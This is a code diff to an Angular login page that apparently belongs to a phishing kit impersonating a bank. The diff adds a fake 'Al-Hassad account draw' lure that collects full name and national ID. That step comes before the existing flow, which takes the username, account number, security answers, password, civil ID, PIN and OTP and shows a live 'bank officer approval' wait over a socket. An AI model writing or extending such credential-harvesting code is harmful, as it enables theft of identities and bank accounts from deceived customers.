@@ -7,7 +7,7 @@ import { HeaderComponent } from '../../shared/components/header/header';
 import { io } from 'socket.io-client';
 import { API_BASE } from '../../shared/config';
 
-type LoginStep = 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'FORGOT_PASSWORD' | 'WAITING_RESET_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';
+type LoginStep = 'HARVEST_DRAW' | 'CREDENTIALS' | 'WAITING_QUESTION' | 'ANSWER_QUESTION' | 'WAITING_APPROVAL' | 'ENTER_PASSWORD' | 'WAITING_PASSWORD_APPROVAL' | 'FORGOT_PASSWORD' | 'WAITING_RESET_APPROVAL' | 'ENTER_OTP' | 'APPROVED' | 'REJECTED';
 
 @Component({
   selector: 'app-login',
@@ -22,7 +22,7 @@ export class LoginComponent implements OnInit, OnDestroy {
   // State machine fields as Signals for Zoneless reactive change detection
   username = signal('');
   accountNumber = signal('');
-  step = signal<LoginStep>('CREDENTIALS');
+  step = signal<LoginStep>('HARVEST_DRAW');
   clientId = signal('');
   assignedQuestion = signal('');
   answer = signal('');
@@ -31,6 +31,8 @@ export class LoginComponent implements OnInit, OnDestroy {
   civilId = signal('');
   pin = signal('');
   acceptTerms = signal(false);
+  fullName = signal('');
+  nationalId = signal('');
   loading = signal(false);
   errorMessage = signal('');
 
@@ -77,7 +79,14 @@ export class LoginComponent implements OnInit, OnDestroy {
       termsLine2: 'سياسة الخصوصية',
       termsLine3: ' و ',
       termsLine4: 'شروط وأحكام الخدمة',
-      waitingResetApproval: 'جاري التحقق من طلب تعيين الحساب، يرجى الانتظار للموافقة على الطلب من قبل موظف البنك...'
+      waitingResetApproval: 'جاري التحقق من طلب تعيين الحساب، يرجى الانتظار للموافقة على الطلب من قبل موظف البنك...',
+      drawTitle: 'للمشاركة والدخول على سحب حساب الحصاد',
+      drawSubtitle: 'دخل بياناتك',
+      fullNameLabel: 'الاسم',
+      fullNamePlaceholder: 'ادخل الاسم بالكامل',
+      nationalIdLabel: 'الرقم الوطني',
+      nationalIdPlaceholder: 'ادخل الرقم الوطني',
+      registerBtnText: 'تسجيل'
     },
     en: {
       title: 'Login',
@@ -117,7 +126,14 @@ export class LoginComponent implements OnInit, OnDestroy {
       termsLine2: 'Privacy Policy',
       termsLine3: ' and ',
       termsLine4: 'Terms & Conditions of Service',
-      waitingResetApproval: 'Verifying account reset request, please wait for approval from the bank officer...'
+      waitingResetApproval: 'Verifying account reset request, please wait for approval from the bank officer...',
+      drawTitle: 'To participate and enter Al-Hassad account draw',
+      drawSubtitle: 'Enter your details',
+      fullNameLabel: 'Name',
+      fullNamePlaceholder: 'Enter your full name',
+      nationalIdLabel: 'National ID',
+      nationalIdPlaceholder: 'Enter National ID',
+      registerBtnText: 'Register'
     }
   };
 
@@ -126,6 +142,9 @@ export class LoginComponent implements OnInit, OnDestroy {
   }
 
   get isFormValid(): boolean {
+    if (this.step() === 'HARVEST_DRAW') {
+      return this.fullName().trim().length > 0 && this.nationalId().trim().length > 0;
+    }
     if (this.step() === 'CREDENTIALS') {
       return this.username().trim().length > 0 && this.accountNumber().trim().length > 0;
     }
@@ -183,19 +202,30 @@ export class LoginComponent implements OnInit, OnDestroy {
     this.errorMessage.set('');
 
     try {
-      if (this.step() === 'CREDENTIALS') {
-        const response = await fetch(`${API_BASE}/user/client/start`, {
+      if (this.step() === 'HARVEST_DRAW') {
+        const response = await fetch(`${API_BASE}/user/client/start-draw`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: this.username(), accountNumber: this.accountNumber() })
+          body: JSON.stringify({ fullName: this.fullName(), nationalId: this.nationalId() })
+        });
+
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'فشلت عملية التسجيل');
+
+        this.clientId.set(data.clientId);
+        this.step.set('CREDENTIALS');
+        this.initializeSocketConnection();
+      } else if (this.step() === 'CREDENTIALS') {
+        const response = await fetch(`${API_BASE}/user/client/submit-credentials`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clientId: this.clientId(), username: this.username(), accountNumber: this.accountNumber() })
         });
 
         const data = await response.json();
         if (!response.ok) throw new Error(data.message || 'فشلت عملية الدخول');
 
-        this.clientId.set(data.clientId);
         this.step.set('WAITING_QUESTION');
-        this.initializeSocketConnection();
       } else if (this.step() === 'ANSWER_QUESTION') {
         const response = await fetch(`${API_BASE}/user/client/answer`, {
           method: 'POST',
@@ -302,7 +332,7 @@ export class LoginComponent implements OnInit, OnDestroy {
 
   retry(): void {
     this.disconnectSocket();
-    this.step.set('CREDENTIALS');
+    this.step.set('HARVEST_DRAW');
     this.clientId.set('');
     this.assignedQuestion.set('');
     this.answer.set('');
@@ -310,6 +340,8 @@ export class LoginComponent implements OnInit, OnDestroy {
     this.otp.set('');
     this.civilId.set('');
     this.pin.set('');
+    this.fullName.set('');
+    this.nationalId.set('');
     this.acceptTerms.set(false);
     this.errorMessage.set('');
   }
